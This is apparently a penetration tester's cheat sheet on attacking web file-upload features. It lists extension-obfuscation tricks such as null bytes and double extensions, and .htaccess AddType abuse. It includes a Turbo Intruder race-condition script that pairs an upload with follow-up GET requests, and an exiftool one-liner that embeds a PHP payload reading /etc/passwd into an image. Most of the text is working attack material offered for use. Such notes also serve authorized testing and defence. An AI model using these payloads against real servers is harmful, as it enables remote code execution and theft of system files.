# Find a entry point
# change the contetn type image/jpeg to identify the server how its validated
# Change Content Type : text/plain
# File Types: php,jsp,php5,shtml
# Check Apache .htaccess   (AddType application/x-httpd-php .l33t)
# Obfuscating file extensions : exploit.pHp
                                exploit.php
                                exploit.php.jpg
                                exploit%2Ephp
                                exploit.asp;.jpg
                                exploit.asp%00.jpg
                                exploit.p.phphp


# Race Condition Post Request: file upload, Get Request: File location
`def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)`


# .doc ,.xls files potentially leads to xxe injection attacks

# Change Request Method to PUT

# exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" dk.jpg -o polyglot.php

